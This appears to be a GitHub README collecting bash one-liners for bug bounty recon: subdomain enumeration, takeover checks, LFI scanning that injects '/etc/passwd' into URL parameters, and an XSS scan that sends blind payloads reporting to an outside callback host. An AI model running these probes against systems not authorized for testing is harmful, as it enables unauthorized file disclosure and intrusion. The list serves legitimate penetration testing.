# 🛰️ ReconToolkit

A curated list of powerful one-liners and tools for **Subdomain Enumeration**, **Subdomain Takeover Detection**, **LFI Scanning**, and **XSS Testing**. Perfect for bug bounty hunters and pentesters.

## Subdomain Enumeration

### Juicy Subdomains
```bash
subfinder -d target.com -silent | dnsx -silent | cut -d ' ' -f1 \
| grep -Ei 'api|dev|stg|test|admin|demo|stage|pre|vpn'
```

### Online Intelligence Sources
- **BufferOver.run**
```bash
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u
```

## Subdomain Takeover Detection
```bash
cat subs.txt | xargs -P50 -I% bash -c 'dig % | grep CNAME' \
| awk '{print $1}' | sed 's/\.$//g' \
| httpx -silent -status-code -cdn -csp-probe -tls-probe
```

## LFI Payload Scanning

### Using `gf`, `httpx`, and `/etc/passwd` filter
```bash
cat targets.txt | gau | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 \
-random-agent -x GET,POST -tech-detect -status-code -follow-redirects \
-mc 200 -mr "root:[x*]:0:0:"
```

### With `qsreplace` for quick injection
```bash
cat targets.txt | gau | gf lfi | qsreplace "/etc/passwd" \
| xargs -I% -P25 sh -c 'curl -s "%" | grep -q "root:x" && echo "[+] VULN: %"'
```

## One-Liner XSS Scanner
```bash
subfinder -dL domainlist1.txt | dnsx | shuf | (gau || hakrawler) | anew \
| egrep -iv "\.(jpg|jpeg|gif|tif|tiff|png|ttf|woff|woff2|php|ico|pdf|svg|txt|js)$" \
| urless | nilo | dalfox pipe -b https://xss.hunter/?q=1
```

## Shodan CLI
```bash
shodan search 'Ssl.cert.subject.CN:"target.com"' --fields ip_str | anew ips.txt
```

## 🛠 Requirements
- [`subfinder`](https://github.com/projectdiscovery/subfinder)
- [`dnsx`](https://github.com/projectdiscovery/dnsx)
- [`httpx`](https://github.com/projectdiscovery/httpx)
- [`gf`](https://github.com/tomnomnom/gf)
- [`qsreplace`](https://github.com/tomnomnom/qsreplace)
- [`dalfox`](https://github.com/hahwul/dalfox)
- [`shodan`](https://cli.shodan.io)
- `jq`, `curl`, `nmap`, `awk`, `sed`
```
## 📄 License
MIT
> Made with ❤️ for recon & hacking by [@nav1n0x](https://github.com/ifconfig-me)
```

## Credit Goes to
1. @TheMsterDoctor1 https://x.com/TheMsterDoctor1/status/1905471835128373665
